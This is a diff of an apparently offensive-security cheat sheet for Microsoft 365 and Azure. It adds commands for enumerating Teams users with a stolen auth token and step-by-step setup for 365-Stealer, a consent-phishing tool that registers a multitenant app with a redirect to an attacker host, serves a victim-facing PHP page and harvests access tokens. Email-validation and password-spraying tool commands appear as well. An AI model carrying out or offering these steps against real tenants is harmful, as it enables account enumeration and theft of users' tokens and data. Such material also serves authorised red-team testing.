@@ -186,14 +186,16 @@ python3 o365spray.py --validate --domain <targetDomain>
 ```
 
 ## Verify email addresses
-* https://login.microsoftonline.com/common/GetCredentialType
 * https://github.com/dievus/Oh365UserFinder
 * https://github.com/LMGsec/o365creeper
+* https://github.com/immunIT/TeamsUserEnum
 
 ```
 python3 Oh365UserFinder.py -r <emailFile> -w <output> -t <seconds>
 
 o365creeper.py -f <emailsFile> -o <validEmailsFile>
+
+go run userEnum.go userenum -f <userFile> -t "<authToken-eyJ..>
 ```
 
 ## Basic Azure Storage Url
@@ -223,15 +225,29 @@ Get Access Token by creating an application in the attacker tenant and send the 
 https://portal.azure.com > Azure Active Directory > App Registrations > New registration > Choose Name
 Supported Account Types: Check - 'Accounts in any organizational directory (Any Azure AD directory - Multitenant)
 Choos Web from Dropdown: Web
-Redirect Uri: https://attacker365-StealerRhost/login/authorized
-Register > Certificates & Secrets > New Client Secret > Add > Api Permissions > Add a permission > Microsoft Graph > Delegated permissions
+Redirect Uri: https://<attacker365StealerRhost>/login/authorized
+Register > Certificates & Secrets > New Client Secret > Add > note: Secret ID
+Api Permissions > Add a permission > Microsoft Graph > Delegated permissions
 Search: user.read
 Check: user.read and User.ReadBasic.All > Add permissions
-Overview > note Application (Client) ID
+Overview > note: Application (Client) ID
 
+vim yourVictims/index.php
+insert: public $ipWhitelist = array(
+           '127.0.0.1',
+           '<ip>',
+
+php --ini
+vim php.ini
+insert:
+extension=sqlite3
+
+sudo apt install php7.4-mbstring
+systemctl restart apache2
+php -S <365StealerIp>:8080
+pip3 install -r requirements.txt
+python 365-Stealer.py --set-config
 python 365-Stealer.py --run-app
-
-Use access token with graph.microsoft.com/v1.0/users list users in target tenant
 ```
 
 ## Authenticated User Enumeration and Password Spraying
